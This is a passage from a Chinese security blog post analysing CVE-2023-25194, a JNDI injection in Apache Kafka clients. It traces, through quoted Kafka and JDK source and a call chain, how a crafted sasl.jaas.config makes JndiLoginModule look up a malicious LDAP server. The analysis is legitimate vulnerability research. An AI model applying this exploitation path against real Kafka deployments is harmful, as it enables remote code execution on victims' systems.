class="built_in">this</span>.jaasContexts.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var12.hasNext()) &#123;</span><br><span class="line">                Map.Entry&lt;String, JaasContext&gt; entry = (Map.Entry)var12.next();</span><br><span class="line">                <span class="type">String</span> <span class="variable">mechanism</span> <span class="operator">=</span> (String)entry.getKey();</span><br><span class="line">                <span class="type">LoginManager</span> <span class="variable">loginManager</span> <span class="operator">=</span> LoginManager.acquireLoginManager((JaasContext)entry.getValue(), mechanism, defaultLoginClass, configs);</span><br><span class="line">                <span class="built_in">this</span>.loginManagers.put(mechanism, loginManager);</span><br><span class="line">                <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> loginManager.subject();</span><br><span class="line">                <span class="built_in">this</span>.subjects.put(mechanism, subject);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.mode == Mode.SERVER &amp;&amp; mechanism.equals(<span class="string">&quot;GSSAPI&quot;</span>)) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.maybeAddNativeGssapiCredentials(subject);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.securityProtocol == SecurityProtocol.SASL_SSL) &#123;</span><br><span class="line">                <span class="built_in">this</span>.sslFactory = <span class="keyword">new</span> <span class="title class_">SslFactory</span>(<span class="built_in">this</span>.mode, <span class="built_in">this</span>.sslClientAuthOverride, <span class="built_in">this</span>.isInterBrokerListener);</span><br><span class="line">                <span class="built_in">this</span>.sslFactory.configure(configs);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var9) &#123;</span><br><span class="line">            <span class="built_in">this</span>.close();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">KafkaException</span>(var9);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中this.jaasContexts：</p>
<p><img src="https://pic.imgdb.cn/item/642bf0fa6ea21b9a9e63e032.jpg" alt="image-20230403200819510"></p>
<p>进入while循环，执行如下一行代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">LoginManager</span> <span class="variable">loginManager</span> <span class="operator">=</span> LoginManager.acquireLoginManager((JaasContext)entry.getValue(), mechanism, defaultLoginClass, configs);</span><br></pre></td></tr></table></figure>

<p>跟进org.apache.kafka.common.security.authenticator.LoginManager#acquireLoginManager：</p>
<p><img src="https://pic.imgdb.cn/item/642bf1086ea21b9a9e6424b0.jpg" alt="image-20230403201144766"></p>
<p>其中jaasConfigValue的value字段为POC中sasl.jaas.config的值。loginManager为null，调用org.apache.kafka.common.security.authenticator.LoginManager#LoginManager：</p>
<p><img src="https://pic.imgdb.cn/item/642bf1146ea21b9a9e646dc1.jpg" alt="image-20230403201458983"></p>
<p>其中loginMetadata的loginClass字段为：</p>
<p><img src="https://pic.imgdb.cn/item/642bf1246ea21b9a9e64d17e.jpg" alt="image-20230403201544460"></p>
<p>因此this.login是一个org.apache.kafka.common.security.authenticator.DefaultLogin实例。之后又调用了<code>this.login.login()</code>，跟进org.apache.kafka.common.security.authenticator.AbstractLogin#login：</p>
<p><img src="https://pic.imgdb.cn/item/642bf1326ea21b9a9e65295f.jpg" alt="image-20230403201712476"></p>
<p>又调用了javax.security.auth.login.LoginContext#login：</p>
<p><img src="https://pic.imgdb.cn/item/642bf1496ea21b9a9e65a283.jpg" alt="image-20230403201751765"></p>
<p>调用了javax.security.auth.login.LoginContext#invokePriv，并传入了LOGIN_METHOD，它的值是”login”：</p>
<p><img src="https://pic.imgdb.cn/item/642bf1586ea21b9a9e65ee78.jpg" alt="image-20230403201905949"></p>
<p>javax.security.auth.login.LoginContext#invokePriv部分代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(String methodName)</span> <span class="keyword">throws</span> LoginException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// start at moduleIndex</span></span><br><span class="line">        <span class="comment">// - this can only be non-zero if methodName is LOGIN_METHOD</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> moduleIndex; i &lt; moduleStack.length; i++, moduleIndex++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">mIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                Method[] methods = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (moduleStack[i].<span class="keyword">module</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">                    methods = moduleStack[i].<span class="keyword">module</span>.getClass().getMethods();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// instantiate the LoginModule</span></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line">                    <span class="comment">// Allow any object to be a LoginModule as long as it</span></span><br><span class="line">                    <span class="comment">// conforms to the interface.</span></span><br><span class="line">                    Class&lt;?&gt; c = Class.forName(</span><br><span class="line">                                moduleStack[i].entry.getLoginModuleName(),</span><br><span class="line">                                <span class="literal">true</span>,</span><br><span class="line">                                contextClassLoader);</span><br><span class="line"></span><br><span class="line">                    Constructor&lt;?&gt; constructor = c.getConstructor(PARAMS);</span><br><span class="line">                    Object[] args = &#123; &#125;;</span><br><span class="line">                    moduleStack[i].<span class="keyword">module</span> = constructor.newInstance(args);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// call the LoginModule&#x27;s initialize method</span></span><br><span class="line">                    methods = moduleStack[i].<span class="keyword">module</span>.getClass().getMethods();</span><br><span class="line">                    <span class="keyword">for</span> (mIndex = <span class="number">0</span>; mIndex &lt; methods.length; mIndex++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (methods[mIndex].getName().equals(INIT_METHOD)) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    Object[] initArgs = &#123;subject,</span><br><span class="line">                                        callbackHandler,</span><br><span class="line">                                        state,</span><br><span class="line">                                        moduleStack[i].entry.getOptions() &#125;;</span><br><span class="line">                    <span class="comment">// invoke the LoginModule initialize method</span></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line">                    <span class="comment">// Throws ArrayIndexOutOfBoundsException if no such</span></span><br><span class="line">                    <span class="comment">// method defined.  May improve to use LoginException in</span></span><br><span class="line">                    <span class="comment">// the future.</span></span><br><span class="line">                    methods[mIndex].invoke(moduleStack[i].<span class="keyword">module</span>, initArgs);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// find the requested method in the LoginModule</span></span><br><span class="line">                <span class="keyword">for</span> (mIndex = <span class="number">0</span>; mIndex &lt; methods.length; mIndex++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (methods[mIndex].getName().equals(methodName)) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// set up the arguments to be passed to the LoginModule method</span></span><br><span class="line">                Object[] args = &#123; &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// invoke the LoginModule method</span></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="comment">// Throws ArrayIndexOutOfBoundsException if no such</span></span><br><span class="line">                <span class="comment">// method defined.  May improve to use LoginException in</span></span><br><span class="line">                <span class="comment">// the future.</span></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">status</span> <span class="operator">=</span> ((Boolean)methods[mIndex].invoke</span><br><span class="line">                                (moduleStack[i].<span class="keyword">module</span>, args)).booleanValue();</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                <span class="comment">//......</span></span><br></pre></td></tr></table></figure>

<p>moduleStack如下：</p>
<p><img src="https://pic.imgdb.cn/item/642bf1686ea21b9a9e6643f7.jpg" alt="image-20230403202139848"></p>
<p>在invoke函数中，遍历了moduleStack，进入else：</p>
<p><img src="https://pic.imgdb.cn/item/642bf1776ea21b9a9e669703.jpg" alt="image-20230403202249039"></p>
<p>这里INIT_METHOD的值是”initialize”，这里是反射获取moduleStack[i].entry.getLoginModuleName()也就是com.sun.security.auth.module.JndiLoginModule中的所有方法并遍历，如果找到initialize方法，就利用反射的方法进行调用。</p>
<p>执行完else中的代码之后，接着执行如下的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// find the requested method in the LoginModule</span></span><br><span class="line">                <span class="keyword">for</span> (mIndex = <span class="number">0</span>; mIndex &lt; methods.length; mIndex++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (methods[mIndex].getName().equals(methodName)) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// set up the arguments to be passed to the LoginModule method</span></span><br><span class="line">                Object[] args = &#123; &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// invoke the LoginModule method</span></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="comment">// Throws ArrayIndexOutOfBoundsException if no such</span></span><br><span class="line">                <span class="comment">// method defined.  May improve to use LoginException in</span></span><br><span class="line">                <span class="comment">// the future.</span></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">status</span> <span class="operator">=</span> ((Boolean)methods[mIndex].invoke</span><br><span class="line">                                (moduleStack[i].<span class="keyword">module</span>, args)).booleanValue();</span><br></pre></td></tr></table></figure>

<p>如果上面调用initialize方法的部分看明白了，就能一眼看出这里是调用com.sun.security.auth.module.JndiLoginModule的login方法。跟进后：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">login</span><span class="params">()</span> <span class="keyword">throws</span> LoginException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// attempt the authentication by prompting for the username and pwd</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            attemptAuthentication(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// authentication succeeded</span></span><br><span class="line">           succeeded = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;\t\t[JndiLoginModule] &quot;</span> +</span><br><span class="line">                                <span class="string">&quot;regular authentication succeeded&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (LoginException le) &#123;</span><br><span class="line">            cleanState();</span><br><span class="line">            <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;\t\t[JndiLoginModule] &quot;</span> +</span><br><span class="line">                                <span class="string">&quot;regular authentication failed&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> le;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>调用了com.sun.security.auth.module.JndiLoginModule#attemptAuthentication：</p>
<p><img src="https://pic.imgdb.cn/item/642bf18c6ea21b9a9e66f3bb.jpg" alt="image-20230403203005527"></p>
<p>其中userProvider是在initialize方法中得到的：</p>
<p><img src="https://pic.imgdb.cn/item/642bf19c6ea21b9a9e6730cd.jpg" alt="image-20230403203238068"></p>
<p>也就是我们POC中的恶意ldap服务：</p>
<p><img src="https://pic.imgdb.cn/item/642bf1aa6ea21b9a9e6764ff.jpg" alt="image-20230403203259274"></p>
<p>之后执行lookup完成JNDI注入。</p>
<p>最后贴一下调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">new KafkaProducer&lt;&gt;(props)</span><br><span class="line">	-&gt; KafkaProducer#KafkaProducer(...)</span><br><span class="line">		-&gt; KafkaProducer#newSender(logContext, kafkaClient, this.metadata)</span><br><span class="line">			-&gt; ClientUtils#createChannelBuilder(this.producerConfig, this.time, logContext)</span><br><span class="line">				-&gt; ChannelBuilders#clientChannelBuilder(...;</span><br><span class="line">					-&gt; ChannelBuilders#create(...;</span><br><span class="line">						-&gt; ((ChannelBuilder)channelBuilder)#configure(configs);</span><br><span class="line">							-&gt; LoginManager#acquireLoginManager(...)</span><br><span class="line">								-&gt; new LoginManager(jaasContext, saslMechanism, configs, loginMetadata)</span><br><span class="line">									-&gt; LoginContext#login()</span><br><span class="line">										-&gt; LoginContext#invokePriv(LOGIN_METHOD)</span><br><span class="line">											-&gt; LoginContext#invoke(methodName)</span><br><span class="line">												-&gt; JndiLoginModule#login()</span><br><span class="line">													-&gt; JndiLoginModule#attemptAuthentication(true)</span><br><span class="line">														-&gt; InitialContext#lookup(userProvider)</span><br></pre></td></tr></table></figure>

<p>这个漏洞的利用条件还是比较高的，基于远程LDAP引用注入需要java版本小于11.0.1、8u191、7u201、6u211，因此公网上能够找到的目标并不多。</p>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">2.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析：</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&text=CVE-2023-25194 Kafka JNDI Injection"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&title=CVE-2023-25194 Kafka JNDI Injection"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&is_video=false&description=CVE-2023-25194 Kafka JNDI Injection"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2023-25194 Kafka JNDI Injection&body=Check out this article: https://r4inb00w.github.io/2023/04/04/kafkaJNDI/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&title=CVE-2023-25194 Kafka JNDI Injection"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&title=CVE-2023-25194 Kafka JNDI Injection"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&title=CVE-2023-25194 Kafka JNDI Injection"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&title=CVE-2023-25194 Kafka JNDI Injection"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&name=CVE-2023-25194 Kafka JNDI Injection&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://r4inb00w.github.io/2023/04/04/kafkaJNDI/&t=CVE-2023-25194 Kafka JNDI Injection"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    1970-2099
    rainb0w
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'r4inb00w/r4inb00w.github.io';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
